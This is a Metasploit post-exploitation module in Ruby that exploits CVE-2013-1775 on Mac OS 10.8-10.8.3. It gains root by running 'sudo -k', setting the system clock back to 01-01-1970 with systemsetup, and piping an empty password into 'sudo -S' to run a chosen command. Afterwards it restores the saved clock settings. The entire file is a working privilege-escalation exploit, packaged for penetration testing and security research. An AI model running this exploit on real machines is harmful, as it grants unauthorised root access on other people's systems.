##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#
# http://metasploit.com/
##
require 'shellwords'

class Metasploit3 < Msf::Post
	SYSTEMSETUP_PATH = "/usr/sbin/systemsetup"

	# saved clock config
	attr_accessor :time, :date, :networked, :zone, :network_server

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
			'Name'          => 'Mac OS 10.8-10.8.3 Sudo Password Bypass',
			'Description'   => %q{
				Executes a command with root permissions on versions of OSX with
				sudo binary vulnerable to CVE-2013-1775 (between). Works on Mac OS
				10.8.*, and possibly lower versions.

				If your session belongs to a user with Administrative Privileges
				(the user is in the sudoers file) and the user has ever run the
				"sudo" command, it is possible to become the super user by running
				`sudo -k` and then resetting the system clock to 01-01-1970.

				Fails silently if the user is not an admin, or if the user has never
				ran the sudo command.

				Note: CMD must be the /full/path to the executable.
			},
			'License'       => MSF_LICENSE,
			'Author'        => [ 'joev <jvennix[at]rapid7.com>'],
			'Platform'      => [ 'osx' ],
			'SessionTypes'  => [ 'shell', 'meterpreter'],
			'References'     => [
				['CVE', '2013-1775']
			]
		))
		register_options([
			OptString.new('CMD', [true, 'The command to run as root', '/usr/bin/whoami'])
		])
	end

	def run
		groups = cmd_exec("groups `whoami`")
		systemsetup = SYSTEMSETUP_PATH
		if not groups.include?('admin')
			print_error "User is not in the 'admin' group, bailing."
			return
		else
			# "remember" the current system time/date/network/zone
			print_good("User is an admin, continuing...")
			print_status("Saving system clock config...")
			@time = cmd_exec("#{systemsetup} -gettime").match(/^time: (.*)$/i)[1]
			@date = cmd_exec("#{systemsetup} -getdate").match(/^date: (.*)$/i)[1]
			@networked = cmd_exec("#{systemsetup} -getusingnetworktime") =~ (/On$/)
			@zone = cmd_exec("#{systemsetup} -gettimezone").match(/^time zone: (.*)$/i)[1]
			@network_server = if @networked
				cmd_exec("#{systemsetup} -getnetworktimeserver").match(/time server: (.*)$/i)[1]
			end
			run_exploit
		end
	end

	def cleanup
		return if @_cleaning_up
		@_cleaning_up = true

		print_status("Resetting system clock to original values") if @time
		cmd_exec("#{SYSTEMSETUP_PATH} -settimezone #{[@zone].shelljoin}") unless @zone.nil?
		cmd_exec("#{SYSTEMSETUP_PATH} -setdate #{[@date].shelljoin}") unless @date.nil?
		cmd_exec("#{SYSTEMSETUP_PATH} -settime #{[@time].shelljoin}") unless @time.nil?
		if @networked
			cmd_exec("#{SYSTEMSETUP_PATH} -setusingnetworktime On")
			unless @network_server.nil?
				cmd_exec("#{SYSTEMSETUP_PATH} -setnetworktimeserver #{[@network_server].shelljoin}")
			end
		end
		super
	end

	def run_exploit
		sudo_cmd_raw = ['sudo', '-S', datastore['CMD']].join(' ')
		sudo_cmd = 'echo "" | '+sudo_cmd_raw
		cmd_exec(
			"sudo -k; \n"+
			"#{SYSTEMSETUP_PATH} -setusingnetworktime Off -setdate 01:01:1970"+
		         " -settime 00:00 -settimezone GMT"
		)
		print_good "Running '#{sudo_cmd_raw}':"
		output = cmd_exec(sudo_cmd)
		if output =~ /incorrect password attempts\s*$/i
			print_error "User has never run sudo, and is therefore not vulnerable. Bailing."
			return
		end
		puts output
	end
end
